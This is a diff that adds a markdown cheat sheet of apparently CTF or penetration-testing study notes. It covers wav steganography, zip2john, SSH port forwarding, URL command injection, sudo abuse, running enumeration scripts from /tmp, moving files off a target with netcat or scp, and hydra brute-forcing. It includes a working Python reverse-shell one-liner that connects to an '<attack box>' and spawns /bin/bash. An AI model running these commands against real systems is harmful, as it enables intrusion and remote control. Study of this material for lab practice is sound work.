@@ -1,1 +1,48 @@
+## stego for .wav files
+  Exwave.py
 
+## Convert zip files to a john hash
+  zip2john
+
+## Script to concatenate a hash and token
+
+script.py
+  import hashlib
+  import binascii
+
+  USERNAME = 'username here'
+  PASSWORD = 'password here'
+  TOKEN = hashlib.sha256((USERNAME+PASSWORD).encode('ascii')).hexdigest()
+  print("TOKEN = " + TOKEN)
+
+
+## Gain a stable environment 
+
+  know commands to gain a full shell
+
+## SSH port forwarding
+
+  ssh -L localport:localhost:remoteport user@ip
+
+## python reverse shell one-liner
+
+  import socket, os, pty; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<attack box>", 5555)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); pty.spawn("/bin/bash")
+
+## weburl injection 
+
+  www.helloworld.com/file.php?cmd=whoami
+
+## Recommendations
+
+  study the sudo command and how to run sudo as other users and execute absolute path commands against an absolute path script/file
+
+  dropping scripts onto a target machine in the /tmp directory and executing them for enumeration (Lineas)
+
+  ways to bring files from target machine to your attack box (SCP, Netcat, http.server) 
+
+  files may be encoded MULTIPLE times
+
+  be familiar with hydra against different protocols (may take a long time)
+
+  stephamore file in dcode directory
+  
